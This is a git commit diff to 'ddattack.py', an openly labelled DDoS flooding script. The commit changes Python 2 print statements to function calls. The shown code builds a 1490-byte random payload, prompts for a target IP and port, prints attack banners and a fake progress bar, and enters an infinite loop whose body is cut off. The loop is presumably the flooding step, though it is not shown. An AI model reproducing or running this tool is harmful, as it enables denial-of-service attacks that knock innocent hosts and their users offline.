82a3a7a38ba725a73b90c120b4a226432006a626
anonymous <78273014+noobforanonymous@users.noreply.github.com>
2021-02-09 04:46:51 -0500

    Update ddattack.py

--- ddattack.py
+++ ddattack.py
@@ -19,25 +19,25 @@ load = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDOS Attack | lolcat")
-print "author      :  ANONYMOUS"
-print "website     :  https://dev-regaanthamimprogramming.pantheonsite.io"
-print "You Tube    :  https://www.youtube.com/channel/UCpKJnmkqAYVqLbl3ZWhh4yA"
-print "github      :  https://github.com/noobforanonymous"
+print ("author      :  ANONYMOUS")
+print ("website     :  https://dev-regaanthamimprogramming.pantheonsite.io")
+print ("You Tube    :  https://www.youtube.com/channel/UCpKJnmkqAYVqLbl3ZWhh4yA")
+print ("github      :  https://github.com/noobforanonymous")
 
 rt = raw_input("Enter Your Target IP : ")
 hack = input("Enter Any Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Started  |  lolcat")
-print "[                    ] wait 0% loading"
+print ("[                    ] wait 0% loading")
 time.sleep(5)
-print "[=====               ] wait 25% loading"
+print ("[=====               ] wait 25% loading")
 time.sleep(5)
-print "[==========          ] wait 50% loading"
+print ("[==========          ] wait 50% loading")
 time.sleep(5)
-print "[===============     ] wait 75% loading"
+print ("[===============     ] wait 75% loading")
 time.sleep(5)
-print "[====================] Now 100% Completed to start attacking"
+print ("[====================] Now 100% Completed to start attacking")
 time.sleep(3)
 send = 0
 while True:
